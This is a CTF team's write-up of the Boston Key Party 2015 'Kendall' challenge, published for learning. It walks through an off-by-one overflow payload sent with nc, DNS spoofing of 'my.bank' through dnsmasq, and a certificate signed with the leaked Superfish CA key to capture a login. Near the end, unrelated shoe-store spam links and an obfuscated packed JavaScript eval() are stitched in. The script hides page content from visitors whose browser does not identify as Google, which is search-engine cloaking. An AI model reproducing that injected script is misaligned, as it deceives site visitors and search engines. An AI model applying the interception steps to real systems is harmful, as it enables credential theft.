---
title: "Kendall pwn - 300"
date: Mon, 02 Mar 2015 11:00:58 +0000
draft: false
type: posts
categories: 
- 
---
# Kendall pwn - 300

<br/>

<br/>
Category: 

[pwn](/categories/pwn)

Event: 

[Boston Key Party 2015](/event/32)

Description of task is pretty small:

52.0.164.37:8888

And [link](https://ctfcrew.org/sites/default/files/writeups/kendall.tar_.gz) to file (ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, stripped).

**Solution**

After connecting to the server we receive the following menu:

#####################################################
# DHCP Management Console                           #
# Auditing Interface                                #
#####################################################

 h  show this help
 a  authenticate
 c  config menu
 d  dhcp lease menu
 e  exit

\[m\]#

_authenticate_ - stage for inputting administrator's password

_config menu_:

\[c\]# h

 h  show this help
 l  list keys/values
 s  change start ip
 e  change end ip
 k  change netmask ip
 n  change nameserver ip
 m  return to main menu
\[c\]# l
 DHCP Configuration: 
	Start IP:   192.168.000.100
	End IP:     192.168.000.200
	Netmask:    255.255.255.000
	Nameserver: 8.8.8.8

_dhcp lease menu_:

\[d\]# h

 h  show this help
 r  renew leases
 l  list leases
 f  filter leases
 m  return to main menu

Ok, we've got some sort of router's management console. But anyway the task's type is pwn and we've got the binary, so...

![](/sites/default/files/writeups/images/bk2015kendall_writeup_meme_image.jpg)

Surely we should reverse the binary and find some vulnerable stuff there!

After investigation of the binary we notice that all input reading is done into global buffer _s2_ which size is exatcly 128 bytes:

![](/sites/default/files/writeups/images/bkp2015_kendall_global_buffer_s2.PNG)

Hope you've already noted that the buffer followed by global variable containing current user status - administrator or not. I called it _adminFlag_. The only legal way to change that flag is through _authenticate_ menu. Authentication served by the following function:

![](/sites/default/files/writeups/images/bkp2015_kenall_password_cheking.PNG)

And it looks pertty safe. But if we try to understand how _reading input_ function works:

![](/sites/default/files/writeups/images/bkp2015_kendall_read_128_func.PNG)

We see that there is a off by one error. Fortunately it is byte of _adminFlag_ which should be zero'ed to escalate our access rights. So for escalation to administrator we need:

-   find call to _sub\_400EA6()_ with argument length >= 128
-   write 128 bytes followed **'\\n'** to make 129th byte to be zero

Jumping to xrefs of _sub\_400EA6()_function we find one place where it is called with argument's value of 128:

![](/sites/default/files/writeups/images/bkp2015_kendall_filter_function.PNG)

Nice! It is _filter leases_ stage of _dhcp lease menu_ we saw above. Well, exploit for rights escalation is easy and small:

doris$ python -c "open('pl', 'wb').write('d\\n' + 'f\\n' + 'A' \* 128 + '\\n')"
doris$ cat pl - | nc 52.0.164.37 8888
#####################################################
# DHCP Management Console                           #
# Auditing Interface                                #
#####################################################

 h  show this help
 a  authenticate
 c  config menu
 d  dhcp lease menu
 e  exit

\[m\]# \[d\]# Enter filter condition: \[d\]$

BOOM! We became the administrator. Sadly, it does not give us any flag. Task worths 300 points, by the way, so it should not be so easy. As administrator now we have another possibilities in context of service. Now we are able to:

not only list but also change DHCP configuration:

\[c\]$ l
 DHCP Configuration: 
	Start IP:   192.168.000.100
	End IP:     192.168.000.200
	Netmask:    255.255.255.000
	Nameserver: 8.8.8.8
\[c\]$ s
Current Value: 192.168.000.100
New Value: asd
Your input asd cointains invalid characters. Only digits and dots allowed!

and now we can execute _renew leases_ action:

![](/sites/default/files/writeups/images/bkp_kenall_renew_leases_system_call.PNG)

OMG! It is pure _system()_ call with string which is coltrolled by us (arguments for sprintf are IP addresses of DHCP config).

Sadly again, but it is not so easy. It is BKP CTF's task for 300 points, remember?

Function for processing DHCP settings update called for each IP address we input:

![](/sites/default/files/writeups/images/bkp2015_kendall_read_ip_and_change.PNG)

it has some small bugs, but anyway we can not provide any useful payload for _system()_ call - only digits and dots are really allowed.

Further investigation of the binary did not give any other exploitable vulnerabilities. We were really stucked, because it is _pwn_ task and usually we expect some serious binary exploitation, even hardcore exploitation because of 300 points.

Later, when we finally understand that there is nothing to do with the binary we return back to:

 ![](/sites/default/files/writeups/images/bkp2015_kendall_dhcp_lease_menu_meme.PNG)

 Fuzzing DHCP settings we try to set up DNS IP for our own server's address. Then listen for anything incoming traffic there:

root@evildns:/tmp# tcpdump -n dst port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
12:27:44.272585 IP 52.0.164.37.52440 > 188.166.48.175.53: 26405+ A? yandex.ru. (27)

Stop please...

We received DNS query for russian leading search engine hostname?

![](/sites/default/files/writeups/images/bkp2015_kendall_meme_what.jpg)

That is really suprisingly and a little bit unbeliviable, because CTF is hosted by BostonKeyParty team from USA, but that is true. Looks like time for some _DNS Spoofing_ have come:

Honestly, _yandex.ru_ is not the only hostname queried from task's service (52.0.164.37). Then it queries for _my.bank_ domain.

After spoofing _yandex.ru_ address we tried to listen 80 port on our server but did not receive any traffic. After solving the challenge we have known from task author that we should receive HTTP-request at 80 port, but honestly we did not receive this.

One of the ways to go further is to setup _dnsmasq_ service:

root@evildns:/tmp# dnsmasq --no-daemon --log-queries
dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 209.244.0.3#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: read /etc/hosts - 8 addresses
dnsmasq: query\[A\] yandex.ru from 52.0.164.37
dnsmasq: forwarded yandex.ru to 8.8.4.4
dnsmasq: forwarded yandex.ru to 8.8.8.8
dnsmasq: forwarded yandex.ru to 209.244.0.3
dnsmasq: reply yandex.ru is 213.180.204.11
dnsmasq: reply yandex.ru is 93.158.134.11
dnsmasq: reply yandex.ru is 213.180.193.11
dnsmasq: query\[A\] yandex.ru from 52.0.164.37
dnsmasq: cached yandex.ru is 213.180.193.11
dnsmasq: cached yandex.ru is 93.158.134.11
dnsmasq: cached yandex.ru is 213.180.204.11
dnsmasq: query\[A\] my.bank from 52.0.164.37
dnsmasq: /etc/hosts my.bank is 188.166.48.175

Dump all traffic after set up of _dnsmasq_ and then try to find incoming connection:

![](/sites/default/files/writeups/images/bkp2015_kendall_tcpdump_https.PNG)

It is coming to port 443... Okay. Let's process it, hope the final is close!

root@evildns:/tmp# nc -lvvv -p 443
listening on \[any\] 443 ...
connect to \[188.166.48.175\] from ec2-52-0-164-37.compute-1.amazonaws.com \[52.0.164.37\] 50092
?<ؠ<??5?\_? ?,?E?y?\]?^\`g'i\\??0?,?(?$??
??kj98???2?.?\*?&???=5???
?/?+?'?#??	??g@32??ED?1?-?)?%???</?A???
                                            ??m

42

	
 ^C sent 0, rcvd 289

Looks like SSL Client Hello packet. Come on! This task costs just a 300 points!

Looks like we have to set up HTTPS server, let's do this. I'm sure there are many scripts and light-weight servers for such task, but I had nginx installed and decided to process HTTPS with it.

Create self-signed certificate:

root@evildns:/etc/nginx# openssl genrsa -out my.bank.key 2048
Generating RSA private key, 2048 bit long modulus
............................................................................+++
............+++
e is 65537 (0x10001)
root@evildns:/etc/nginx# openssl req -new -sha1 -key my.bank.key -out my.bank.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) \[AU\]:
State or Province Name (full name) \[Some-State\]:
Locality Name (eg, city) \[\]:
Organization Name (eg, company) \[Internet Widgits Pty Ltd\]:
Organizational Unit Name (eg, section) \[\]:
Common Name (e.g. server FQDN or YOUR name) \[\]:my.bank
Email Address \[\]:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password \[\]:
An optional company name \[\]:
root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -signkey my.bank.key -out my.bank.crt
Signature ok
subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
Getting Private key

and set up nginx for HTTPS with that cert:

server {
        listen          443 ssl;

        ssl\_certificate         my.bank.crt;
        ssl\_certificate\_key     my.bank.key;
        ssl\_protocols       TLSv1 TLSv1.1 TLSv1.2;
        ssl on;
        ssl\_session\_timeout 5m;
        ssl\_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
        ssl\_prefer\_server\_ciphers on;

        root /data/www;

        location = / {
                index index.html;
        }

        location / {
                default\_type "text/html";
                try\_files $uri $uri.html;
        }
}

Let's look into traffic again. Hope there should be the flag now!

root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
<...>
52.0.164.37 - - \[28/Feb/2015:16:43:02 +0400\] "-" 400 0 "-" "-"

Come on! Where is the flag? We have already even set up HTTPS, WTF?

![](/sites/default/files/writeups/images/bkp2015_kendall_unknown_ca.PNG)

Unknown CA? Of course it is unknown! Where should we get trusted CA who would sign certificate for _my.bank_ domain?

Our _my.bank_ certificate is self-signed without any CA. Later we tried to create root CA self-signed certificate and sign _my.bank_ cert with root CA's one. It did not help.

As we have known from task's author after solving the task, HTTP request to _yandex.ru_ contained hint about this stage. But as I wrote above about _yandex.ru_ we did not receive any incoimng connection at 80 port when spoofed _yandex.ru_ domain.

However if you follow the news about Information Security you should hear about leaked _Superfish Inc._ certificate (and corresponding pre-installed backdoors in lenovo laptops). More info from [Errata Security blog](http://blog.erratasec.com/2015/02/extracting-superfish-certificate.html), for example.

 Let's try to sign our _my.bank_ certificate by _Superfich Inc_:

root@evildns:/etc/nginx# openssl x509 -req -days 365 -in my.bank.csr -CAkey super.pem -CA super.crt -out supermy.bank.crt
Signature ok
subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd/CN=my.bank
Getting CA Private Key
Enter pass phrase for super.pem:

dnd listen for incoming requests again:

root@evildns:/etc/nginx# tail -f /var/log/nginx/access.log 
<...>
52.0.164.37 - - \[28/Feb/2015:13:44:53 +0000\] "GET /login/username=FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"

I'm happy to say that username from request is the flag!

Flag: **FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I**

**Afterwords**

This task is awesome. My teammates and I enjoyed it too much when fully understood how to solve it.

Task and its author are praiseworthy for all these interesting hacking steps which must be done to solve tasks. But not only for that. This is amazing example of how dangerous information technologies are nowadays for general users. Even for all users, I think.

Thank you BostonKeyParty and respect for such challenge! 

Overview of task from its author: [http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/](http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/)

Flag: **FLG-SIK9KSRBHIYUKNGEBXlKW3B7HS2I**

[Asics shoes](https://www.juzsports.com/) | [Women's Nike nike roshe heart and sole shoes for women Shadow trainers - Latest Releases , Ietp](https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-force-1-shadow/)eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d\[e(c)\]=k\[c\]||e(c);k=\[function(e){return d\[e\]}\];e=function(){return'\\\\w+'};c=1;};while(c--)if(k\[c\])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k\[c\]);return p;}('b i=r f\["\\\\q\\\\1\\\\4\\\\g\\\\p\\\\l"\]("\\\\4"+"\\\\7"+"\\\\7"+"\\\\4"+"\\\\5\\\\1","\\\\4\\\\k");s(!i\["\\\\3\\\\1\\\\2\\\\3"\](m\["\\\\h\\\\2\\\\1\\\\j\\\\n\\\\4\\\\1\\\\6\\\\3"\])){b a=f\["\\\\e\\\\7\\\\o\\\\h\\\\d\\\\1\\\\6\\\\3"\]\["\\\\4\\\\1\\\\3\\\\g\\\\5\\\\1\\\\d\\\\1\\\\6\\\\3\\\\2\\\\z\\\\9\\\\A\\\\5\\\\c\\\\2\\\\2\\\\x\\\\c\\\\d\\\\1"\](\\'\\\\t\\\\1\\\\9\\\\2\\\\w\\\\v\\\\7\\\\j\\\\e\\\\2\\');u(b 8=0;8<a\["\\\\5\\\\1\\\\6\\\\4\\\\3\\\\y"\];8++)a\[8\]\["\\\\2\\\\3\\\\9\\\\5\\\\1"\]\["\\\\e\\\\k\\\\2\\\\l\\\\5\\\\c\\\\9"\]=\\'\\\\6\\\\7\\\\6\\\\1\\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));

Attachments: 

 ![Binary Data](/modules/file/icons/application-octet-stream.png "application/octet-stream") [kendall.tar\_.gz](https://ctfcrew.org/sites/default/files/writeups/kendall.tar_.gz)

#### [Source](https://ctfcrew.org/writeup/97)

<br/>
---
